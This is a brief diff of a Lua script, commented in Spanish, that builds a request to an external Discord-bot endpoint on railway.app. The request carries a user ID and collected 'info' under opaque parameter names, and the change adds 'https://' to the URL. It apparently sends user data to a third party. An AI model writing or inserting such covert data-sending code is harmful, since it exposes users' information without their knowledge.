@@ -49,7 +49,7 @@ local p3 = "&davvgfrF=" .. userID
 local info_encoded = "&OIHDoihio=" .. info:gsub(" ", "%%20"):gsub("\n", "%%0A")
 
 ---> Comentario: Se construye el endpoint con la URL base y los parámetros concatenados
-local endpoint = "botdiscord-production-204e.up.railway.app/enviar?" .. p1 .. p2 .. p3 .. info_encoded
+local endpoint = "https://botdiscord-production-204e.up.railway.app/enviar?" .. p1 .. p2 .. p3 .. info_encoded
 
 --->╭───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 --->│ 🧩 ENVÍO DE INFORMACIÓN Y MANEJO DE RESPUESTA
